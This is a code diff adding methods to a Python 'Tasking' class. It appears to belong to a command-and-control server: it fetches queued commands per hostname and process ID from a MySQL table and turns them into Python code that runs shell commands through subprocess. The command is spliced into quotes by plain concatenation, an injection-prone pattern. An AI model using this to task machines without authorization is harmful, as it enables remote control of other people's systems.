@@ -1,5 +1,6 @@
 import pymysql
-from core.config import *
+#from core.config import *
+from config import *
 
 
 class Tasking(object):
@@ -52,3 +53,45 @@ class Tasking(object):
 
         except Exception:
             raise
+
+    def generate_command_code(self, command):
+        """
+        DESCRIPTION:
+            This function generates python 2.x code to execute a shell command
+
+        ARGUMENTS:
+            str: command
+
+        RETURNS:
+            str: code
+        """
+        code = "import subprocess; subprocess.Popen('" + command + "', stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
+        return code
+
+    def get_tasking(self, hostname, process_id):
+        """
+        DESCRIPTION:
+            This function gets tasking from the "tasks" table
+
+        ARGUMENTS:
+            str: hostname
+            str: process_id
+
+        RETURNS:
+
+        """
+        try:
+            with self.connection.cursor() as cursor:
+                statement = "SELECT task_action, task_secondary FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
+                cursor.execute(statement, (hostname, process_id))
+                result = cursor.fetchone()
+
+                if result[0] == "command":
+                    return self.generate_command_code(result[1])
+
+        except Exception:
+            raise
+
+t = Tasking()
+print(t.has_tasking("MINT-TESTING", "90735"))
+print(t.get_tasking("MINT-TESTING", "90735"))
